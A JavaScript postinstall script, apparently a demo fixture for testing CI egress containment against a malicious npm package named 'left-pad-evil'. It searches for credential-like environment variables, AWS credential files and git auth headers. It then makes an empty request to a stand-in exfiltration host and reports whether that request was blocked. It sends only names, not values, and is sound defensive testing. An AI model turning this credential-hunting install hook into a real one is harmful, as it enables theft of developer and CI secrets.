// DEMO FIXTURE, harmless by design (CLAUDE.md rule 7, demo/supply-chain/README.md).
// It does what a malicious install script does first (look for credentials, call home)
// but only ever reports env var NAMES, never values, and its single request is an
// empty GET to a domain the CI job's egress policy blocks. Nothing is sent.
"use strict";
const fs = require("fs");
const https = require("https");
const os = require("os");
const path = require("path");

const EXFIL = "https://exfil.example.com/collect";
fs.writeFileSync(path.join(__dirname, ".postinstall-ran"), "");

const LOOKED_FOR = [
  "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN", "AWS_WEB_IDENTITY_TOKEN_FILE",
  "ACTIONS_ID_TOKEN_REQUEST_URL", "ACTIONS_ID_TOKEN_REQUEST_TOKEN", "ACTIONS_RUNTIME_TOKEN",
  "GITHUB_TOKEN", "GH_TOKEN", "NPM_TOKEN",
];
const found = Object.keys(process.env)
  .filter((k) => LOOKED_FOR.includes(k) || /SECRET|PASSWORD|PRIVATE_KEY/i.test(k))
  .sort();
const awsFile = fs.existsSync(path.join(os.homedir(), ".aws", "credentials"));
let gitCred = false;
try {
  // npm links file: deps, so __dirname is the source dir (demo/supply-chain/left-pad-evil)
  const cfg = fs.readFileSync(path.resolve(__dirname, "../../../.git/config"), "utf8");
  gitCred = /extraheader|authorization/i.test(cfg);
} catch (_) { /* not in a checkout */ }

console.log("left-pad-evil postinstall (harmless demo):");
console.log(`- credential-like env vars: ${found.length ? found.join(", ") : "none"}`);
console.log(`- ~/.aws/credentials: ${awsFile ? "present" : "none"}`);
console.log(`- git credentials in the checkout: ${gitCred ? "present" : "none"}`);

let done = false;
const report = (line, verdict) => {
  if (done) return;
  done = true;
  console.log(line);
  console.log(verdict);
};
const loot = found.length > 0 || awsFile || gitCred;
const req = https.get(EXFIL, { timeout: 5000 }, (res) => {
  res.resume();
  report(`- call to ${EXFIL}: answered HTTP ${res.statusCode}  <-- egress NOT blocked`, "RESULT: NOT contained");
});
const blocked = (why) => report(`- call to ${EXFIL}: failed (${why}): egress blocked`,
  loot ? "RESULT: NOT contained (something to steal was present)" : "RESULT: contained");
req.on("timeout", () => { blocked("timeout"); req.destroy(); });
req.on("error", (e) => blocked(e.code || e.message));
